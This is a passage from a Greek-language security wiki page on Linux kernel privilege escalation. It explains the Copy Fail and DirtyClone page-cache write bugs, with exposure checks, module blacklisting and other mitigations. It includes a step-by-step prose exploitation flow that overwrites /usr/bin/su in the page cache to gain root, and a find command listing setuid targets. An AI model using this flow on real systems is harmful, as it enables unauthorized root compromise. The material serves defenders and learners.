- Helpers που ξεκινούν από **root services**
- Binaries που εκτελούνται συχνά από **containers που μοιράζονται τον host kernel/page cache**

#### Παράδειγμα διαδρομής με AF_ALG + `splice()`

Το Copy Fail (CVE-2026-31431) είναι καλό παράδειγμα αυτής της κατηγορίας. Η ευάλωτη διαδρομή βρισκόταν στο Linux crypto userspace API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- Το `splice()` μπορεί να μεταφέρει αναφορές σε pages του page cache από ένα αναγνώσιμο αρχείο στο crypto TX scatterlist
- Η διαδρομή αποκρυπτογράφησης του `algif_aead`, που λειτουργεί in-place, επαναχρησιμοποιούσε τα source και destination buffers
- Το `authencesn` έγραφε στη συνέχεια στην περιοχή του destination tag
- Όταν η περιοχή εξακολουθούσε να αναφέρεται σε spliced pages που υποστηρίζονταν από αρχεία, η εγγραφή κατέληγε στο **page cache του αρχείου-στόχου**

Επομένως, η ενδιαφέρουσα τεχνική δεν είναι το ίδιο το CVE, αλλά το μοτίβο:

- **τροφοδοτήστε ένα kernel subsystem με cached pages που υποστηρίζονται από αρχεία**
- κάντε το subsystem να τις **αντιμετωπίσει ως writable output**
- ενεργοποιήστε μια μικρή, ελεγχόμενη overwrite στη μνήμη

Το δημόσιο PoC χρησιμοποίησε επαναλαμβανόμενες **εγγραφές 4 byte** για να τροποποιήσει το `/usr/bin/su` στη μνήμη και στη συνέχεια το εκτέλεσε.<sup>[[4]](#references)[[7]](#references)</sup>

#### Παράδειγμα διαδρομής ESP / XFRM + netfilter TEE clone

Το DirtyClone (CVE-2026-43503) παρουσιάζει μια άλλη παραλλαγή του ίδιου μοτίβου **εγγραφής στο root μόνο μέσω του page cache**, αλλά αυτή τη φορά ο sink είναι η **αποκρυπτογράφηση IPsec ESP** αντί για το `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Η σημαντική τεχνική είναι το βήμα **metadata-laundering**:

- Το `splice()` τοποθετεί ένα **read-only page του page cache που υποστηρίζεται από αρχείο** σε ένα ESP-in-UDP packet
- Η αρχική mitigation του DirtyFrag επισήμανε το skb με `SKBFL_SHARED_FRAG`, ώστε το `esp_input()` να **κάνει αντιγραφή πριν από την αποκρυπτογράφηση**
- Το netfilter `TEE` αντιγράφει το packet μέσω των `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- Το clone διατηρεί την **ίδια φυσική αναφορά στο page cache**, αλλά χάνει το `SKBFL_SHARED_FRAG`
- Στη συνέχεια, το `esp_input()` θεωρεί το clone ασφαλές και εκτελεί **αποκρυπτογράφηση `cbc(aes)` in-place** πάνω στο page που υποστηρίζεται από αρχείο

Το γενικότερο δίδαγμα για τους reviewers είναι ευρύτερο από το ίδιο το CVE: αν μια mitigation βασίζεται σε **metadata skb/page** για να αποφασίσει αν πρέπει πρώτα να γίνει αντιγραφή, οποιαδήποτε **διαδρομή clone/copy που διατηρεί το backing page αλλά απορρίπτει τα metadata** μπορεί να επανενεργοποιήσει σιωπηρά το primitive εγγραφής.

Τυπική ροή exploitation:

1. Χρησιμοποιήστε `unshare(CLONE_NEWUSER | CLONE_NEWNET)` για να αποκτήσετε **`CAP_NET_ADMIN` μέσα σε ένα ιδιωτικό network namespace**
2. Ενεργοποιήστε το loopback και εγκαταστήστε έναν κανόνα **netfilter `TEE`** στο `mangle/OUTPUT`
3. Εγκαταστήστε **XFRM ESP transport SAs** μέσω `NETLINK_XFRM`
4. Κωδικοποιήστε κάθε target word 4 byte στο πεδίο `seq_hi` του SA (το τέχνασμα επιλογής word του DirtyFrag)
5. Στείλτε το spliced ESP-in-UDP packet, ώστε το **TEE clone** να φτάσει στο `esp_input()` και να αποκρυπτογραφήσει **in-place**
6. Επαναλάβετε μέχρι το αντίγραφο του `/usr/bin/su` στο page cache ή κάποιο άλλο privileged executable να περιέχει κώδικα που ελέγχει ο attacker

Σε πρακτικό επίπεδο, ο αντίκτυπος είναι ίδιος με το παράδειγμα `AF_ALG`: το αρχείο στον δίσκο παραμένει καθαρό, αλλά το `execve()` χρησιμοποιεί τα **αλλοιωμένα bytes του page cache** και δίνει root.<sup>[[8]](#references)[[9]](#references)</sup>

Χρήσιμοι έλεγχοι έκθεσης για αυτήν την παραλλαγή:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Η βραχυπρόθεσμη μείωση της επιφάνειας επίθεσης εξαρτάται και εδώ από τη διαδρομή: η αναβάθμιση σε kernel που περιλαμβάνει το `48f6a5356a33` διορθώνει τη διαδρομή `clone`, ενώ ο αποκλεισμός της αυτόματης φόρτωσης του `xt_TEE` αφαιρεί το **βήμα αλλοίωσης των flags** και ο αποκλεισμός των `esp4` / `esp6` αφαιρεί το **sink αποκρυπτογράφησης**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Έκθεση και αναζήτηση

Αν υποψιάζεστε αυτή την κατηγορία σφάλματος, μην βασίζεστε μόνο σε ελέγχους ακεραιότητας δίσκου. Επαληθεύστε επίσης:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Οι παρακάτω τιμές ρυθμίσεων διακρίνουν μια διεπαφή που μπορεί να φορτωθεί από μία ενσωματωμένη στον kernel· οι κανόνες build του crypto αντιστοιχίζουν το `CONFIG_CRYPTO_USER_API_AEAD` στο `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: το `algif_aead` μπορεί να φορτωθεί/αφαιρεθεί ως module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: η διεπαφή είναι ενσωματωμένη στον kernel
- τα setuid binaries είναι καλοί στόχοι, επειδή ένα patch που αφορά μόνο το page cache μπορεί να αρκεί για να μετατρέψει ένα τοπικό foothold σε root

#### Μείωση της επιφάνειας επίθεσης για το μονοπάτι `algif_aead`

Αν η ευάλωτη διεπαφή παρέχεται από ένα module που μπορεί να φορτωθεί:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Αν έχει μεταγλωττιστεί στον kernel, ορισμένες αναφορές ανέφεραν ότι μπλοκάρουν τη διαδρομή init με:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Αξίζει να θυμάστε αυτό το είδος mitigation και για άλλα kernel LPEs: αν η εκμετάλλευση εξαρτάται από ένα συγκεκριμένο προαιρετικό interface, η απενεργοποίηση ή η προσθήκη του interface στη blacklist μπορεί να διακόψει τη διαδρομή του exploit, ακόμη και πριν γίνει διαθέσιμη μια πλήρης αναβάθμιση του kernel.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – παραβίαση script που εκτελείται ως root σε κατάλογο PaperCut με δυνατότητα εγγραφής από χρήστη](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) — συχνές ερωτήσεις](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Γνωστοποίηση στο Openwall oss-security για το CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Διόρθωση στο Linux stable: crypto: algif_aead - Επαναφορά λειτουργίας out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — συμβουλευτικό δελτίο για το CVE-2026-31431](https://copy.fail/)
- [7] [Τεχνική ανάλυση των Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Αποθετήριο DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Ανάλυση και εκμετάλλευση της παραλλαγής Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Διόρθωση Linux: net: skb: διατήρηση του `SKBFL_SHARED_FRAG` στο `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Παλαιότερο mitigation του Linux: ορισμός του `SKBFL_SHARED_FRAG` για UDP πακέτα που έχουν υποστεί splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — σελίδα εγχειριδίου Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — τεκμηρίωση του Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Συσχετίσεις εφαρμογών MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Προδιαγραφή Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Προδιαγραφή Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Γλώσσα Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile του Linux crypto](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: ευπάθεια page cache του Linux kernel AF_ALG](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Τεκμηρίωση Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Τεκμηρίωση Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Τεκμηρίωση ρυθμίσεων Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Τεκμηρίωση systemd generator](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: μηχανισμοί persistence](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
